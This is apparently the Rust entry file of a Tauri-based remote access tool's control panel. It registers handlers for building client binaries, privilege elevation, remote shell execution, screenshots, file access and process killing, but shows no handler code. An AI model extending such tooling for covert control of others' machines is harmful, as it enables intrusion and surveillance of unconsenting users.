#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
use std::sync::{ Arc, Mutex };
use tauri::Manager;

mod client;
mod server;
mod handlers;

use handlers::{
    tauri::{
        build_client,
        execute_shell_command,
        fetch_client,
        fetch_state,
        fetch_clients,
        handle_system_command,
        manage_file,
        manage_shell,
        read_files,
        start_server,
        take_screenshot,
        process_list,
        kill_process,
        manage_client,
        visit_website,
        elevate_client,
        test_messagebox,
        send_messagebox,
    },
    SharedTauriState,
    SharedServer,
    TauriState,
};

#[tokio::main(worker_threads = 3)]
async fn main() {
    tauri::Builder
        ::default()
        .manage(SharedTauriState(Arc::new(Mutex::new(TauriState::default()))))
        .setup(move |app| {
            let app_handle = app.handle().clone();
            let shared_server = SharedServer(Arc::new(Mutex::new(server::Server::new(app_handle))));

            app.manage(shared_server);

            Ok(())
        })
        .invoke_handler(
            tauri::generate_handler![
                start_server,
                fetch_state,
                build_client,
                fetch_clients,
                fetch_client,
                read_files,
                manage_file,
                take_screenshot,
                handle_system_command,
                manage_shell,
                execute_shell_command,
                process_list,
                kill_process,
                manage_client,
                visit_website,
                elevate_client,
                test_messagebox,
                send_messagebox
            ]
        )
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}
